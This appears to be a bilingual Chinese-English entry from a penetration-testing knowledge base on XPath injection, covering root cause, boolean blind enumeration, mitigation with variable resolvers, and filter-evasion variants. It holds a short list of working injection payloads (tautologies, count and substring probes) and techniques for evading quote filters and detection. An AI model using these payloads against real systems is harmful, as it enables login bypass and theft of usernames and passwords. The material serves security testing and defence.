overview.zh: 覆盖 XPath 表达式注入的布尔化枚举验证：闭合 XPath 字面量后以布尔谓词、节点计数与 substring 条件逐字符提取。适用于输入拼接进 XPath 查询的 XML 数据源场景。
overview.en: Covers boolean-style enumeration for XPath expression injection: closing the XPath literal, then extracting character by character via boolean predicates, node counts, and substring conditions. Suitable for XML data sources where input is concatenated into XPath queries.

vulnerability.zh: 根因是输入被插入 XPath 字面量或谓词，可关闭原字符串并追加 or、节点选择或函数；许多 XML API 缺少统一参数绑定，与 SQL 注入同源但针对 XML 查询。
vulnerability.en: The root cause is input inserted into XPath literals or predicates, closing the original string and appending or-expressions, node selections, or functions; many XML APIs lack unified parameter binding, making this SQL-injection-like but targeting XML queries.

exploitation.zh: 使用第 1 步命令逐行提交 XPath 闭合、节点计数与 substring 逐字符提取变体；响应随条件真假出现稳定差异即确认 XPath 注入可布尔化枚举。先用受控账户建立匹配/不匹配基线，再以相同闭合方式发送真假谓词，盲测只对测试节点做 count 或单字符判断。
exploitation.en: Use the step 1 command to submit XPath closures, node counts, and substring character-by-character extraction variants line by line; stable response differences across true/false conditions confirm boolean-enumerable XPath injection. Build matched/unmatched baselines with a controlled account first, then send true/false predicates with the same closure, limiting blind tests to count or single-character checks on test nodes.

mitigation.en: Use fixed XPath with a variable resolver and never concatenate paths or predicates; without a variable API, apply a vetted literal encoder and restrict XML access permissions; after the fix, replaying true/false predicates must show no response differences.

description.zh: 在路径查询输入处提交恒真表达式变体，节点匹配条件恒成立，校验逻辑被短路直接放行，即可进入授权区域访问数据。
description.en: At XPath inputs submit or 1=1 or ''=' tautologies; matching always succeeds, short-circuiting the check into approval.

attackChain.payload:
' or 1=1 or ''='
' or name()='admin' or '
count(/child::node())
' and string-length(/root/child::*)>0 and '1'='1
' or substring(//user[position()=1]/child::node()[position()=1],1,1)='a

description.zh: 用节点名、计数与子节点轴探测文档层级结构，报错与返回差异逐步拼出目标 XML 结构轮廓完成侦察定位。
description.en: Probe names and depth with name(), count() and child:: axes; errors and returns sketch the document outline.

title.zh: 子串比较逐字符提取内容

description.zh: 对目标节点用子串函数按位比较字符，真假条件映射结果差异，循环还原节点内的用户名口令等敏感文本内容，内容随之落地。
description.en: Compare characters with substring position tests; branch differences rebuild node text such as usernames and passwords.

review.rationale: XPath 条件是查询表达式载荷，不是 XML 工具命令。

description.zh: 绕过对整节点回显的过滤：按字符位置切片做布尔盲提取；真假条件可区分即成功。
description.en: Slice by character position for boolean blind extraction when whole-node echoing is filtered; distinguishable true/false conditions confirm success.

description.zh: 在 XML 载体场景绕过引号字符过滤：引号以十六进制实体表示，解析后还原；谓词成立改变结果集即成功。
description.en: Encode quotes as hex entities for XML carriers where raw quotes are filtered; an altered result set when parsed confirms success.

description.zh: 绕过对布尔谓词特征的检测：用竖杠做 XPath 节点集联合直接定位第二用户节点；返回目标节点数据即成功。
description.en: Union node sets with a pipe to directly target nodes, evading boolean-predicate detection; returned target-node data confirms success.
